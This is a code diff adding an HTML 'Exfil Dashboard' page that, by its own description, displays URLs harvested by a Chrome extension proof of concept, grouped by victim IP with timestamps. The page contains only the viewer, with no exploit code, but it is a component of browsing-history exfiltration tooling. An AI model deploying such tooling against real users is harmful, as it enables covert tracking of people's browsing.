@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Exfil Dashboard</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: monospace; background: #0d0d0d; color: #c9d1d9; min-height: 100vh; padding: 2rem; }
+    h1 { color: #f85149; margin-bottom: 0.5rem; }
+    .subtitle { color: #8b949e; font-size: 0.85rem; margin-bottom: 2rem; }
+    .controls { margin-bottom: 1.5rem; display: flex; gap: 1rem; align-items: center; flex-wrap: wrap; }
+    button {
+      background: #21262d; border: 1px solid #30363d; color: #c9d1d9;
+      padding: 0.4rem 1rem; cursor: pointer; border-radius: 4px; font-family: monospace;
+    }
+    button:hover { background: #30363d; }
+    #status { font-size: 0.8rem; color: #8b949e; }
+    .profile {
+      background: #161b22; border: 1px solid #30363d;
+      border-radius: 6px; margin-bottom: 1.5rem; overflow: hidden;
+    }
+    .profile-header {
+      background: #21262d; padding: 0.75rem 1rem;
+      display: flex; justify-content: space-between; align-items: center;
+      border-bottom: 1px solid #30363d; cursor: pointer;
+    }
+    .profile-ip   { color: #f0883e; font-size: 1rem; font-weight: bold; }
+    .profile-meta { color: #8b949e; font-size: 0.75rem; text-align: right; }
+    .profile-body { padding: 0.5rem 0; }
+    .entry {
+      display: flex; align-items: baseline; gap: 0.75rem;
+      padding: 0.35rem 1rem; border-bottom: 1px solid #21262d;
+    }
+    .entry:last-child { border-bottom: none; }
+    .entry-ts  { color: #8b949e; font-size: 0.72rem; white-space: nowrap; flex-shrink: 0; }
+    .entry-url { color: #79c0ff; font-size: 0.85rem; word-break: break-all; }
+    .badge-partial {
+      background: #f0883e33; border: 1px solid #f0883e; color: #f0883e;
+      font-size: 0.65rem; padding: 0.1rem 0.4rem; border-radius: 3px; flex-shrink: 0;
+    }
+    .badge-full {
+      background: #3fb95033; border: 1px solid #3fb950; color: #3fb950;
+      font-size: 0.65rem; padding: 0.1rem 0.4rem; border-radius: 3px; flex-shrink: 0;
+    }
+    .stats { display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .stat {
+      background: #1f6feb22; border: 1px solid #1f6feb55; color: #79c0ff;
+      font-size: 0.72rem; padding: 0.15rem 0.5rem; border-radius: 12px;
+    }
+    .empty { color: #8b949e; text-align: center; padding: 3rem; }
+    .collapsed .profile-body { display: none; }
+  </style>
+</head>
+<body>
+  <h1>&#x26A0; Exfil Dashboard &mdash; IP Profiles</h1>
+  <p class="subtitle">URLs collected from Chrome extension PoC, grouped by source IP</p>
+  <div class="controls">
+    <button onclick="refresh()">&#x21BB; Refresh</button>
+    <button onclick="startAuto()">&#x25B6; Auto (3s)</button>
+    <button onclick="stopAuto()">&#x25A0; Stop</button>
+    <button onclick="expandAll()">&#x25BC; Expand all</button>
+    <button onclick="collapseAll()">&#x25B6; Collapse all</button>
+    <span id="status">Idle</span>
+  </div>
+  <div id="output"><p class="empty">No data received yet.</p></div>
+
+  <script>
+    let autoTimer = null;
+
+    async function refresh() {
+      document.getElementById("status").textContent = "Fetching...";
+      try {
+        const res  = await fetch("/profiles");
+        const data = await res.json();
+        render(data);
+        const ips   = Object.keys(data).length;
+        const total = Object.values(data).reduce((n, p) => n + p.entries.length, 0);
+        document.getElementById("status").textContent =
+          `Last updated: ${new Date().toLocaleTimeString()} — ${ips} profile(s), ${total} URL(s)`;
+      } catch (e) {
+        document.getElementById("status").textContent = "Error: " + e.message;
+      }
+    }
+
+    function render(data) {
+      const out = document.getElementById("output");
+      const ips = Object.keys(data);
+      if (!ips.length) { out.innerHTML = '<p class="empty">No data received yet.</p>'; return; }
+
+      out.innerHTML = ips.map(ip => {
+        const p       = data[ip];
+        const entries = p.entries.slice().reverse();
+        const partial = entries.filter(e => e.partial).length;
+        const full    = entries.filter(e => !e.partial).length;
+        const safeId  = "p-" + btoa(ip).replace(/[^a-zA-Z0-9]/g, "");
+
+        return `
+          <div class="profile" id="${safeId}">
+            <div class="profile-header" onclick="toggle('${safeId}')">
+              <div>
+                <div class="profile-ip">&#x1F4BB; ${escHtml(ip)}</div>
+                <div class="stats" style="margin-top:0.4rem">
+                  <span class="stat">First: ${p.firstSeen.replace("T"," ").slice(0,19)}</span>
+                  <span class="stat">Last: ${p.lastSeen.replace("T"," ").slice(0,19)}</span>
+                  <span class="stat">${full} complete</span>
+                  <span class="stat">${partial} partial</span>
+                </div>
+              </div>
+              <div class="profile-meta">${entries.length} URL(s) &#x25BC;</div>
+            </div>
+            <div class="profile-body">
+              ${entries.map(e => `
+                <div class="entry">
+                  <span class="entry-ts">${e.ts.replace("T"," ").slice(0,19)}</span>
+                  <span class="${e.partial ? "badge-partial" : "badge-full"}">${e.partial ? "PARTIAL" : "FULL"}</span>
+                  <span class="entry-url">${escHtml(e.url)}</span>
+                </div>`).join("")}
+            </div>
+          </div>`;
+      }).join("");
+    }
+
+    function toggle(id) {
+      document.getElementById(id).classList.toggle("collapsed");
+    }
+    function expandAll()   { document.querySelectorAll(".profile").forEach(el => el.classList.remove("collapsed")); }
+    function collapseAll() { document.querySelectorAll(".profile").forEach(el => el.classList.add("collapsed")); }
+
+    function escHtml(s) {
+      return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+    }
+
+    function startAuto() {
+      stopAuto();
+      autoTimer = setInterval(refresh, 3000);
+      document.getElementById("status").textContent = "Auto-refreshing every 3s...";
+      refresh();
+    }
+    function stopAuto() {
+      if (autoTimer) { clearInterval(autoTimer); autoTimer = null; }
+    }
+
+    refresh();
+  </script>
+</body>
+</html>
